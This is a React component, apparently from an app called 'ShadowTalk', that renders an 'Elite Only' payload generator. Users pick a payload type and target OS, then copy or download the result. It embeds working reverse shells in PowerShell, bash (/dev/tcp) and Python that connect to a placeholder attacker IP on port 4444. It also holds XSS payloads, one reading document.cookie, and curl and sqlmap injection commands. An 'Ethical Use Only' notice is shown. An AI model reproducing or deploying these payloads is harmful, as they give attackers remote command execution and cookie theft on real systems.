import { useState } from "react";
import { Shield, Copy, Download, AlertTriangle, Terminal } from "lucide-react";
import { Card, CardContent, CardHeader } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Textarea } from "@/components/ui/textarea";
import { Badge } from "@/components/ui/badge";
import { Alert, AlertDescription } from "@/components/ui/alert";

const PayloadGenerator = () => {
  const [payloadType, setPayloadType] = useState("");
  const [targetOS, setTargetOS] = useState("");
  const [generatedPayload, setGeneratedPayload] = useState("");

  const payloadTypes = [
    { value: "reverse_shell", label: "Reverse Shell", danger: "medium" },
    { value: "bind_shell", label: "Bind Shell", danger: "medium" },
    { value: "xss_basic", label: "XSS Test Script", danger: "low" },
    { value: "sql_injection", label: "SQL Injection Test", danger: "low" },
    { value: "buffer_overflow", label: "Buffer Overflow Test", danger: "high" },
    { value: "privilege_escalation", label: "Privilege Escalation", danger: "high" }
  ];

  const operatingSystems = [
    { value: "windows", label: "Windows" },
    { value: "linux", label: "Linux" },
    { value: "macos", label: "macOS" },
    { value: "android", label: "Android" }
  ];

  const generatePayload = () => {
    if (!payloadType || !targetOS) return;

    const payloads = {
      reverse_shell: {
        windows: `# Windows PowerShell Reverse Shell (Ethical Testing Only)
$client = New-Object System.Net.Sockets.TCPClient("YOUR_IP",4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()`,
        linux: `#!/bin/bash
# Linux Bash Reverse Shell (Ethical Testing Only)
bash -i >& /dev/tcp/YOUR_IP/4444 0>&1

# Alternative Python version:
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
      },
      xss_basic: {
        windows: `<!-- XSS Test Payload - Web Application Testing -->
<script>
    alert('XSS Vulnerability Detected - ShadowTalk Security Test');
    console.log('DOM:', document.cookie);
</script>

<!-- Advanced XSS Test -->
<img src=x onerror="alert('XSS: ' + document.domain)">
<svg onload="alert('SVG XSS Test')">`,
        linux: `# XSS Test Payloads for Linux Web Servers
curl -X POST "http://target.com/search" -d "q=<script>alert('XSS')</script>"

# SQLMap XSS Testing
sqlmap -u "http://target.com/page?id=1" --xss --batch`
      }
    };

    const payload = payloads[payloadType]?.[targetOS] || "Payload template not available for this combination.";
    setGeneratedPayload(payload);
  };

  const copyToClipboard = () => {
    navigator.clipboard.writeText(generatedPayload);
  };

  const downloadPayload = () => {
    const element = document.createElement("a");
    const file = new Blob([generatedPayload], { type: 'text/plain' });
    element.href = URL.createObjectURL(file);
    element.download = `shadowtalk_${payloadType}_${targetOS}.txt`;
    document.body.appendChild(element);
    element.click();
    document.body.removeChild(element);
  };

  return (
    <Card className="bg-card/50 backdrop-blur-sm border-border shadow-glow">
      <CardHeader>
        <div className="flex items-center space-x-2">
          <Shield className="h-5 w-5 text-red-400" />
          <h3 className="text-lg font-semibold">Payload Generator</h3>
          <Badge variant="destructive" className="text-xs">Elite Only</Badge>
        </div>
      </CardHeader>
      <CardContent className="space-y-4">
        <Alert>
          <AlertTriangle className="h-4 w-4" />
          <AlertDescription>
            <strong>Ethical Use Only:</strong> These payloads are for authorized penetration testing and security research only. 
            Unauthorized use is illegal and unethical.
          </AlertDescription>
        </Alert>

        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
          <div className="space-y-2">
            <label className="text-sm font-medium">Payload Type</label>
            <Select value={payloadType} onValueChange={setPayloadType}>
              <SelectTrigger>
                <SelectValue placeholder="Select payload type" />
              </SelectTrigger>
              <SelectContent>
                {payloadTypes.map((type) => (
                  <SelectItem key={type.value} value={type.value}>
                    <div className="flex items-center space-x-2">
                      <span>{type.label}</span>
                      <Badge 
                        variant={type.danger === "high" ? "destructive" : type.danger === "medium" ? "secondary" : "outline"}
                        className="text-xs"
                      >
                        {type.danger}
                      </Badge>
                    </div>
                  </SelectItem>
                ))}
              </SelectContent>
            </Select>
          </div>

          <div className="space-y-2">
            <label className="text-sm font-medium">Target OS</label>
            <Select value={targetOS} onValueChange={setTargetOS}>
              <SelectTrigger>
                <SelectValue placeholder="Select target OS" />
              </SelectTrigger>
              <SelectContent>
                {operatingSystems.map((os) => (
                  <SelectItem key={os.value} value={os.value}>
                    {os.label}
                  </SelectItem>
                ))}
              </SelectContent>
            </Select>
          </div>
        </div>

        <Button 
          onClick={generatePayload} 
          className="w-full btn-glow"
          disabled={!payloadType || !targetOS}
        >
          <Terminal className="h-4 w-4 mr-2" />
          Generate Payload
        </Button>

        {generatedPayload && (
          <div className="space-y-3">
            <div className="flex items-center justify-between">
              <label className="text-sm font-medium">Generated Payload</label>
              <div className="flex space-x-2">
                <Button size="sm" variant="outline" onClick={copyToClipboard}>
                  <Copy className="h-3 w-3 mr-1" />
                  Copy
                </Button>
                <Button size="sm" variant="outline" onClick={downloadPayload}>
                  <Download className="h-3 w-3 mr-1" />
                  Download
                </Button>
              </div>
            </div>
            <Textarea
              value={generatedPayload}
              readOnly
              className="font-mono text-xs bg-muted/50 min-h-[200px]"
            />
          </div>
        )}
      </CardContent>
    </Card>
  );
};

export default PayloadGenerator;